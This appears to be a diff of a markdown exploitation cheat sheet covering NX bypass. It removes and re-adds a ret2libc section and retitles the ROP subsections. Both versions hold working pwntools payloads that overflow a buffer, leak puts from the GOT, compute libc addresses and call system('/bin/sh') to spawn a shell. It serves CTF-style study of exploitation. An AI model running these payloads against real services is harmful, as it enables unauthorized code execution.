@@ -1,93 +1,5 @@
 # No eXecute
 
-## ret2libc
-
-Check if the target binary is using `libc` with the following commands:  
-`ldd <binary>`  
-or  
-`vmmap` - when inside gdb  
-
-List functions provided by your systems libc:  
-`nm -D /lib/$(uname -m)-linux-gnu/libc-*.so | grep -vw U | grep -v "_" | cut -d " " -f 3`  
-
-libc, or any other library, is a list of functions that reside at a known offset from the library base.  
-If you know the library base and the library version, you will also know the target function's address.  
-
-*NX prevents execution from the stack but having arguments there is fine*  
-
-Steps to exec a function in libc:  
-1. find interesting function to spawn a shell (System, Exec* (execl, execle, execlp, execve, execve, etc...))
-2. Set up the stack
-3. Overwrite EIP/RIP with the functions address
-
-Stack setup:  
-1. Offset to EIP
-2. Address of the target function
-3. Return address to be restored after executing the function, i.e. exit() (or anything if we don't care about a graceful exit)
-4. Arguments for the target function
-
----
-
-Find the offest to `system()` in libc, from the base of libc (the path can be found after using `ldd` on the target binary with:  
-
-`readelf -s <libc_path>`  
-
-Additionally find the offset to a function that is present in the binary, e.g. `puts()`.  
-You can leak the address of `puts`, subtract the offset of `puts` from the `puts` address to get the libc base address,  
-the add the offset of `system()` to the base address and call that.  
-Search for "/bin/sh" in libc and follow the above steps - alternatively, use a write-what-where gadget to store "/bin/sh" in memory.  
-
-Can also import libc into pwntools to automate searching for functions, just need to set the libc base address (run `ldd` on the target binary):  
-
-```python3
-from pwn import *
-
-libc = ELF("</path/to/libc.so>")
-libc.address = 0x<ldd_output>
-system_function = libc.symbols.system
-bin_sh = next(libc.search(b'/bin/sh\x00'))
-```
-
-### System() Example
-No ASLR  
----
-
-From the man pages:  
-`int system(const char *cmd);`  
-
-Find system()'s offset from the libc base  
-`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"`  
-The address provided in the second column is the offset  
-Open gdb while debugging the target binary and run: `vmmap libc`. Choose one which has "x" permissions  
-Add the system() offset and the executable libc base to find system()'s address.  
-
-If the above does not work, an alternative is `p system` in gdb.  
-*repeat for exit() if looking to exit gracefully*  
-
-System() requires a pointer to the string as an argument, not the string itself. Need to find "/bin/bash" or similar in the binary.  
-In gdb: `search /bin` to find instances of shells  
-Try to use addresses from libc  
-
-**Example exploit:**  
-
-```python3
-#!/usr/bin/env python3
-from pwn import *
-io = process("./vuln")
-offset = b"A" * 520
-target_func = p64(0x7ffff7e17330)   # system @ 0x7ffff7e17330
-ret_addr = p64(0x7ffff7e09590)    # exit @ 0x7ffff7e09590
-sys_arg = p64(0x7ffff7f61031)   # Argument to system() "/bin/bash" @ 0x7ffff7f61031
-
-payload = offset + target_func + ret_addr + sys_arg
-print(payload)
-
-io.sendline(payload)
-io.interactive()
-```
-
-If you need to pass as a command line arg you can use `(cat payload.txt; cat) | ./vuln`  
-
 ## ROP Chains
 
 Pwntools ROP documentation: <https://docs.pwntools.com/en/latest/rop/rop.html>  
@@ -113,7 +25,7 @@ If the program has an mmap() function, you need to find rop gadgets **after** th
 - You can then use `ltrace` to view the address where mmap is mapped and add instuction offsets
 - Validate by hitting a breakpoint in gdb and addid the 2 values, then `x/i $addr`
 
-## Write What Where
+### Write What Where
 
 Gadgets that allow you to store data in memory, i.e. create a pointer to an argument.  
  
@@ -127,7 +39,7 @@ mov [rdi], rsi; ret;
 xchg byte ptr [rdi], bl; ret;
 ```
 
-## Writeable Locations
+### Writeable Locations
 
 Find writable sections with `readelf -S -W ./vuln`  
 Use pwntools to reference section addresses:  
@@ -151,6 +63,120 @@ The address of .bss can be found with:
 from pwn import *
 context.binary = elf = ELF("./vuln")
 bss_section = elf.symbols.__bss_start
+```
+
+## ret2libc
+
+*Methodology:*  
+Use `printf` or `puts` to leak and address, then calculate the libc base address,  
+and from that, call `system()` with `/bin/sh` as its argument.  
+
+**Information gathering:**  
+Determine the version of libc in use:  
+`ldd <target_binary>`  
+Find offsets to useful functions:  
+`readelf -W -s <libc_file>`  
+
+```python3
+# Offsets
+offsetPuts = 0x00074db0
+offsetSystem = 0x0004c800
+offsetBinSh = 0x1b5faa
+```
+```bash
+# To get the offset of /bin/sh you may need to search in GDB:
+gdb <target_binary>
+b main
+run
+vmmap libc
+search /bin/sh
+# subtract the libc start address from the /bin/sh location to find it's offset
+```
+
+Gather some addresses to leak values, and any ROP gadgets needed to  
+fill registers or remove items from the stack after use.  
+
+```python3
+puts_got = p32(elf.got.puts)
+puts_plt = p32(elf.plt.puts)
+main_ptr = p32(elf.symbols.main)
+pop_ebx = p32(0x0804901e) # 0x0804901e: pop ebx; ret;
+ret = p32(0x0804900a) # 0x0804900a: ret;
+```
+
+**Send a payload to leak the address of puts in the GOT**  
+
+```python3
+# 32 Bit example
+payload1 = flat([
+    offset, # Overflow the buffer to the save EIP
+    puts_plt, # Function to call
+    pop_ebx, # Address we return to after the puts function (cleans our arg from the stack
+    puts_got, # Argument for puts call
+    main_ptr # run main again so we can send a new payload
+])
+io.sendline(payload1)
+leak = io.recv() # The first bytes will contain your leaked address. Bytes should be received up until your next input line.
+
+# 64 Bit example
+payload2 = flat([
+    offset, # Overflow the buffer to the save RIP
+    pop_rdi, # pop our argument into the RDI register
+    puts_got, # argument of the puts call
+    puts_plt, # call puts
+    main_ptr # run main again to send a new payload
+])
+io.sendline(payload2)
+leak = io.recv() # The first bytes will contain your leaked address. Bytes should be received up until your next input line.
+```
+
+*Note: You may need to call certain functions to trigger population of the GOT  
+before you start leaking adresses*  
+
+**Save the leaked address and calculate offsets**  
+
+```python3
+# 32 Bit
+address = unpack(leak[:4])
+print(hex(address))
+
+base = address - offsetPuts
+system = base + offsetSystem
+binSh = base + offsetBinSh
+
+# 64 Bit
+address = leak[:6]
+address += b"\x00\x00"
+print(f"Leaked address: {hex(unpack(leak))}")
+
+base = unpack(address) - offsetPuts
+system = base + offsetSystem
+binSh = base + offsetBinSh
+```
+
+**Spawn a shell**  
+
+```python3
+# 32 Bit
+payload2 = flat([
+    offset, # overflow the buffer up until the saved EIP
+    system, # call system
+    b"BBBB", # dummy return address
+    binSh # pointer to "/bin/sh" as the system() argument
+])
+io.sendline(payload2)
+io.interactive()
+
+# 64 Bit
+payload2 = flat([
+    offset, # overflow the buffer up until the saved RIP
+    ret, # A ret gadget may be needed for stack alignment
+    pop_rdi, # save the argument in RDI
+    binSh, # Argument for system
+    system # call system
+])
+io.sendline(payload2)
+io.interactive()
 ```
 
 ## Stack Pivoting
